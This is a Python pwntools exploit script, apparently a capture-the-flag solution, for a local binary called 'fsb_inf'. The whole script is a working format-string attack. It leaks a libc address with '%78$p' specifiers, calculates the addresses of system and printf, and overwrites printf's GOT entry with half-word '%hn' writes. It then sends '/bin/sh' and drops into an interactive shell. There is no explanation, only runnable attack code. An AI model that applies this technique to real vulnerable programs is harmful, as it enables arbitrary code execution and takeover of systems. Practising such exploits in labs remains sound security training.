from pwn import *

p = process('fsb_inf') #env = {'LD_PRELOAD':'./libc.so.6'}
#libc = ELF('libc.so.6')
elf = ELF('fsb_inf')

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b 
    return a - b 

payload = ""
payload += "%78$p.%79$p.%80$p" 

p.recv()
p.sendline(payload)
p.recvuntil(".")
libc_start_main_ret = int(p.recvuntil(".",drop = True),16)

print hex(libc_start_main_ret)

log.info("libc_start_main_ret addr: " + hex(libc_start_main_ret))

libc_base = libc_start_main_ret - 0x202e1
system_addr = libc_base + 0x3f480
printf_addr = libc_base + 0x4f190
print hex(system_addr)
print hex(printf_addr)

pause()

pattern = "%{}c%{}$hn"

n = 6 + 4
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff
print hex(system_addr)
print hex(system_low)
print hex(system_high)
payload = ""
payload += pattern.format(system_low , n)
payload += pattern.format(s_sub(system_high ,system_low) , n+1)
payload = payload.ljust(32 , "A")

payload += p64(elf.got["printf"])
payload += p64(elf.got["printf"] + 2)

pause()

p.sendline(payload)

p.sendline("/bin/sh\x00")

p.interactive()
